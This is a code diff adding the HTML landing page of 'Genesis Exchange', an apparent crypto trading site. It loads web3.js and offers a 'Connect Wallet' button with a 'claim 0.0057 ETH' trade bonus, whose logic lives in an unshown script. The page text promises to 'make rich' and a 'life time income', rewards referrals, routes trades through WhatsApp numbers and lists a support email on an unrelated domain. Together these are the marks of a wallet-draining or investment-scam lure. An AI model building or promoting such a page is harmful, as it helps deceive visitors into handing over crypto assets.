@@ -1,0 +1,460 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        bgc: '#26759e',
+                        bgcol: '#0f1a2e',
+                        bgstle: 'red',
+                        bgclock: 'black',
+                        bgst: 'white',
+                    }
+                }
+            }
+        }
+    </script>
+    <link rel="stylesheet" href="don.css">
+    <link rel="stylesheet" href="form.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<!-- this is my media screen slideout -->
+<div
+    class="media text-white font-bold text-2xl lg:invisible md:invisible visible  absolute  mt-24 bg-bgc h-full  text-center">
+    <ul class=" gap-6 grid pt-6">
+        <li>
+            <a href="index.html"><i class="fa-solid fa-house"></i> Home</a>
+        </li>
+
+        <li>
+            <a href="About.html"><i class="fa-solid fa-address-card"></i> About</a>
+        </li>
+
+        <li>
+            <a href="form.html"><i class="fa-brands fa-servicestack"></i> Service</a>
+        </li>
+
+        <li>
+            <a href="#"> <i class="fa-brands fa-blogger"></i> Blog</a>
+        </li>
+
+        <li>
+            <a href="#"><i class="fa-solid fa-caret-down"></i> More</a>
+        </li>
+
+    </ul>
+</div>
+
+<body class="bg-bgcol">
+    <nav
+        class="shadow-[0_3px_10px_rgb(0,0,0,0.2)] flex lg:gap-44 items-center bg-bgc w-full h-20 md:gap-11 text-center">
+
+        <div class="logo text-white font-bold lg:text-4xl md:text-3xl text-2xl pl-4">
+            <h1>Genesis</h1>
+        </div>
+
+        <ul class="text-white flex lg:gap-6 md:gap-6 invisible lg:visible md:visible">
+            <li>
+                <a href="#">Home</a>
+            </li>
+
+            <li>
+                <a href="About.html">About</a>
+            </li>
+
+            <li>
+                <a href="#">Service</a>
+            </li>
+
+            <li>
+                <a href="#">Blog</a>
+            </li>
+
+            <li>
+                <a href="#">More</a>
+            </li>
+
+        </ul>
+<!-- 
+        <div class="end">
+            <div class="trx text-white invisible lg:visible md:visible items-center ">
+                <i>
+                    <a href="form.html">Trade Here</a>
+                </i>
+            </div>
+        </div> -->
+
+        <div class="icon text-white lg:invisible md:invisible visible">
+            <span class="material-icons" onclick="slide()">
+                menu
+            </span>
+        </div>
+
+    </nav>
+
+
+    <!-- this is my swipper section  -->
+
+    <div class="background">
+        <div class="general">
+            <div class="swiper  main ">
+                <div class="swiper-wrapper">
+                    <div class="swiper-slide  box">
+                        I ACCEPT AND TRADE ALL CRYPTO ASSETS, DM US FOR YOUR TRADE ,ETH BTC, DOGE, PEPE, SOL, AVAX,
+                        MATIC, SUI, SEI, TRX, USDT, TON, NOT, AND SO ON ,ALSO INBOX US IF YOU WANT LEARN ABOUT FOREX
+                        TRADING, CRYPTO TRADING,LET'S TRADE BOSS , SO YOU WILL BE HAPPY,YOUR HOSPITALITY IS OUR MAIN
+                        PRIORITY, LET'S TRADE YOUR COINS.
+                    </div>
+                    <div class="swiper-slide  box">
+                        WE ARE READY TO ACCEPT ALL DEALS, JUST SLIDE IN LETS DEAL AT A VERY GOOD RATE, ALWAYS REMEMBER
+                        THAT GENESIS TRADE IS THE BEST YOU CAN THINK OF, LETS SERVE YOU BETTER, ALWAYS READY FOR FAST
+                        TRADE.
+                    </div>
+                    <div class="swiper-slide  box">
+                        TRADE AND GET REWARD WITH US, WE REWARD ALL OUR CLIENTS WHO TRADE WITH US FOR THE FIRST TIME,
+                        ARE PAYMENTS ARE FAST AND RELIABLE. DON'T FAIL TO TRADE. MAKE MONEY WHILE YOU KEEP TRADING WITH
+                        US.
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="gen-btc lg:gap-6 md:gap-6 gap-11 flex mt-6">
+
+            <div class="ist">
+                <div class="imge lg:w-44 lg:ml-44 md:w-44 md:ml-12 ml-6">
+                    <div class="imagx">
+                        <img src="pg2.jpeg.jpeg" alt="">
+                    </div>
+
+                    <button onclick="alert('Trade processing.');">
+                        <a href="form.html">TRADE</a>
+                    </button>
+                </div>
+            </div>
+
+
+            <div class="2nd">
+                <div class="imge2 lg:w-44 lg:ml-44 md:w-44 md:ml-12">
+                    <div class="imagx2">
+                        <img src="pg3.jpg.jpeg" alt="">
+                    </div>
+
+                    <button onclick="alert('Trade processing.');">
+                        <a href="form.html">TRADE</a>
+                    </button>
+                </div>
+            </div>
+
+
+            <div class="2nd lg:visible md:visible visible">
+                <div class="imge2 lg:w-44 lg:ml-44 md:w-44 md:ml-12">
+                    <div class="imagx2">
+                        <img src="pg3.jpg.jpeg" alt="">
+                    </div>
+
+                    <button onclick="alert('Trade processing.');">
+                        <a href="form.html">TRADE</a>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+
+        <div
+            class="general-cont bg-bgc  shadow-[0_3px_10px_rgb(0,0,0,0.2)] h-[45rem] text-center mt-6 w-full lg:w-full lg:h-80 lg:mt-24 md:w-full  md:h-80 md:mt-24 lg:flex lg:items-center">
+            <div class="group1">
+                <div class="image1  lg:w-96 md:w-96 w-44">
+                    <img src="remove 1.png" alt="">
+                </div>
+            </div>
+
+            <!-- <div class="image2">
+                <img src="bnb coin.png" alt="">
+            </div> -->
+
+            <div class="group2 mt-6">
+                <h1 class="font-bold lg:text-4xl md:text-3xl text-2xl">
+                    GENESIS EXCHANGE
+                </h1>
+                <p class="mt-6"> I ACCEPT AND TRADE ALL CRYPTO ASSETS, DM US FOR YOUR TRADE ,ETH BTC, DOGE, PEPE, SOL,
+                    AVAX, MATIC, SUI, SEI, TRX, USDT, TON, NOT, AND SO ON ,ALSO INBOX US IF YOU WANT LEARN ABOUT FOREX
+                    TRADING, CRYPTO TRADING,LET'S TRADE BOSS , SO YOU WILL BE HAPPY,YOUR HOSPITALITY IS OUR MAIN
+                    PRIORITY, LET'S TRADE YOUR COINS. WE ARE READY TO ACCEPT ALL DEALS, JUST SLIDE IN LETS DEAL AT A
+                    VERY GOOD RATE, ALWAYS REMEMBER THAT GENESIS TRADE IS THE BEST YOU CAN THINK OF, LETS SERVE YOU
+                    BETTER, ALWAYS READY FOR FAST TRADE. TRADE AND GET REWARD WITH US, WE REWARD ALL OUR CLIENTS WHO
+                    TRADE WITH US FOR THE FIRST TIME, ARE PAYMENTS ARE FAST AND RELIABLE. DON'T FAIL TO TRADE. MAKE
+                    MONEY WHILE YOU KEEP TRADING WITH US.</p>
+            </div>
+
+            <div class="icon lg:invisible font-bold text-3xl">
+                <a href="https://web.facebook.com/coacheth"><i class="fab fa-facebook"></i></a>
+                <a href="https://api.whatsapp.com/send/?phone=2347036234009&text&type=phone_number&app_absent=0"><i
+                        class="fab fa-whatsapp"></i></a>
+                <a href="https://twitter.com/sobster1414"><i class="fab fa-twitter"></i></a>
+            </div>
+        </div>
+
+        <div
+            class="clock  font-extrabold flex text-center justify-center text-rose-500 border-double h-14 items-center  md:text-3xl lg:mt-6">
+            <span id="Hour"></span>: <span id="Minutes"></span>: <span id="Seconds"></span>
+        </div>
+
+        <div class="phase1  grid grid-cols-2 gap-6 md:mt-72 pl-4 pr-4">
+
+            <div class="gen-phase  flex lg:visible items-center ">
+
+                <div class="imago">
+                    <img src="bnb coin.png" alt="">
+                </div>
+
+                <div class="text-phase">
+                    <p>we are available for trading all giftscard and crypto assets.</p>
+
+                    <button class="bg-bgc p-2 rounded" onclick="popout()">
+                        <a href="#">CONTACT</a>
+                    </button>
+                </div>
+
+            </div>
+
+            <div class="gen-phase  flex lg:visible items-center">
+
+                <div class="imago">
+                    <img src="bnb coin.png" alt="">
+                </div>
+
+                <div class="text-phase">
+                    <p>Always contact us when necessary, we trade and you enjoy</p>
+                    <button class="bg-bgc p-2 rounded" onclick="popout()">
+                        <a href="#">CONTACT</a>
+                    </button>
+
+                </div>
+            </div>
+        </div>
+        <section class="bg-bgc mt-6">
+            <div class="third-gen">
+                <div class="text flex items-center pt-6 pl-4 lg:gap-72">
+                    <div class="text-main">
+                        <h1>GENESIS EXCHANGE</h1>
+                        <p>we are here to provide the best services you can ever think of, <br> trade with us and gain
+                            your maximum stability, the genesis is here to make rich.</p>
+                        <button class="bg-bgcol p-2 rounded">
+                            <a href="#">Get Started</a>
+                        </button>
+                    </div>
+                    <div class="ig w-44">
+                        <img src="remove 2.png" alt="">
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <div class="containerimg bg-bgst lg:cover contain items-center lg:pl-4">
+                <div class="inside  ">
+                    <img src="banks.png" alt="">
+                </div>
+            </div>
+        </section>
+        <section>
+            <div class="maint">
+                <div class="he  items-center text-center">
+                    <h1 class="font-bold text-3xl">GENESIS EXCHANGE TRADING CALCULATOR</h1>
+                    <P>Our goal is to be at the heart of the financial services industry as businesses expand across the
+                        globe.</P>
+                </div>
+                <div class="second-main">
+                    <div class="sub lg:flex items-center pt-6 md:flex lg:gap-44 lg:pl-4 md:pl-4">
+                        <div class="text">
+                            <p class="pl-4 text-center pb-4">
+                                Select any of the investment plans we offer <br>
+                                Generate a life time income for yourself
+                                <br>Invite your friends and earn rewards
+                            </p>
+                        </div>
+                        <div class="imgac">
+                            <img src="right-laptop-img.png" alt="">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- this about us section -->
+        <section class="bg-bgc">
+            <h1 class="font-bold text-3xl text-center">
+                About us
+            </h1>
+            <div class="aboutgen">
+                <div class="aboutsub">
+                    <div class="aboutmain">
+                        <div class="aboutinner">
+                            <div class="aboutcover lg:flex md:flex lg:gap-80">
+                                <div class="text">
+                                    <h1 class="font-bold text-center">
+                                        We aim to provide expert advice and quality trading ideas.
+                                    </h1>
+                                    <p class="pl-4 pt-6 pb-4">
+                                        In our bid to make the most of your money, you can choose between
+                                        <br> our services spanning from trading in the stock market to investing
+                                        <br> in natural resources such as oil and gas alongside getting crisp
+                                        <br>opportunities in Real Estate as a whole
+                                        genesis was built to help you be a more confident
+                                        <br>Traders and set you on the path to secure your financial future,
+                                        <br> we help our customers maximize their money, whether you are Trading or
+                                        <br> a seasoned pro, Genesis EXCHANGE does what is
+                                        <br> right for you and your money.
+                                    </p>
+
+                                    <button class="bg-bgcol p-2 rounded pl-4" onclick="popout()">
+                                        <a href="#">CONTACT</a>
+                                    </button>
+                                    <section>
+                                        <div class="contactgen pt-6 shadow-[0_3px_10px_rgb(0,0,0,0.2)] h-80 w-56 bg-bgcol" id="overlay">
+                            
+                                            <span class="material-icons pl-[11rem] " onclick="popin()">
+                                                delete
+                                            </span>
+                                        
+                                            <div class="text pl-6 pt-6">
+                                                <h1>
+                                                    We trade all types of coin like...
+                                                </h1>
+                                                <button>
+                                                    BTC
+                                                </button>
+                                                <button>
+                                                    ETH
+                                                </button>
+                                                <button>
+                                                    USDT
+                                                </button>
+                                                <button>
+                                                    TON
+                                                </button>
+                                                <button>
+                                                    TRON
+                                                </button>
+
+                                            </div>
+
+
+                                            <div class="display pl-6 pt-6">
+                                                <p>Contact us through here for trade, <i class="fa-solid fa-caret-down"></i></p>
+                                                <a href="https://api.whatsapp.com/send/?phone=2348089120249&text&type=phone_number&app_absent=0"> <span class="material-icons">
+                                                    chat
+                                                    </span></a>
+                                            </div>
+                                        </div>
+                                    </section>
+
+
+                                </div>
+                                <div class="imge lg:w-80 ">
+                                    <img src="/service3.jpg" alt="">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- this section is for wallet connect -->
+
+        <div class="gen flex items-center justify-center h-screen contain">
+            <div class="bg-white p-8 rounded-lg shadow-lg items-center">
+                <h1 class="text-2xl font-bold mb-4 text-black">TRADE BONUS</h1>
+                <button id="connectWallet" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-700">Connect
+                    Wallet</button>
+                <button id="sendEth" class="bg-green-500 text-white px-4 py-2 rounded mt-4 hover:bg-green-700" disabled>
+                    claim 0.0057 ETH</button>
+                <button id="wallet" class=" coach w-50 h-50 rounded-2xl text-black"></button>
+            </div>
+        </div>
+
+        <!-- next section is my footer section  -->
+        <div class="footer-gen bg-bgc">
+            <div class="ftsec">
+                <div class="innerft lg:flex md:flex gap-6 pl-2 ">
+                    <div class="first">
+                        <div class="textft">
+                            <h1 class="text-2xl font-bold pt-6">GENESIS</h1>
+                            <p>
+                                In our bid to make the most of your money, you can choose between
+                                <br> our services spanning from trading in the stock market to investing
+                                <br> in natural resources such as oil and gas alongside getting crisp.
+
+                            </p>
+                        </div>
+
+                        <!-- <div class="imh w-80">
+                            <img src="/vision.jpg" alt="">
+                        </div> -->
+                    </div>
+                    <div class="secondft">
+                        <h1 class="text-2xl font-bold  pt-6">RESOURCES</h1>
+                        <ul>
+                            <li class="lg:block">
+                                Home
+                                About
+                                Cryptocurenncy
+                                Stock & Forex
+                                Exchange
+                                FAQ
+                            </li>
+
+                        </ul>
+                        <div class="ijk w-80">
+                            <img src="/banks.png" alt="">
+                        </div>
+                    </div>
+                    <div class="thirdft">
+                        <h1 class="text-2xl font-bold  pt-6">
+                            CONTACT US
+                        </h1>
+
+                        Email: support@prime-wealthinvestments.com
+                        <div class="jhy">
+                            <img src="/security.png" alt="">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+        <script src="don.jsx"></script>
+</body>
+
+</html>
